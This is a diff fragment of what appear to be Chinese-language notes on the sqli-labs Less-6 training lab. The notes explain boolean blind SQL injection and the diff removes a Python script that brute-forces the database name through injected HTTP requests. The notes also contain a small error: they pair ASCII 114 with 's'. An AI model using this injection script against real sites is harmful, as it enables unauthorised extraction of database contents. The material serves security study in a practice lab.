@@ -39,22 +39,3 @@ select ascii(substr(database(),1,1)) < 100;
  所以库名第一个字母的ascii编码为114  ——s
  ---
  用脚本跑
- ```python
- import requests as req
-url = 'http://ip/sqli-labs/Less-6/?id=1'
-res = ''
-select = "select database()"
-for i in range(1, 100):
-    for ascii in range(32, 128):
-        id = '1" and ascii(substr(({}),{},1))={}%23'.format(select, i, ascii)
-        r = req.get(url+id)
-        print(url+id)
-        if "You are in" in r.text:
-            res += chr(ascii)
-            print(res)
-            break
-        if ascii == 127:
-            print('{}'.format(res))
-            exit(0)
- ```
- 
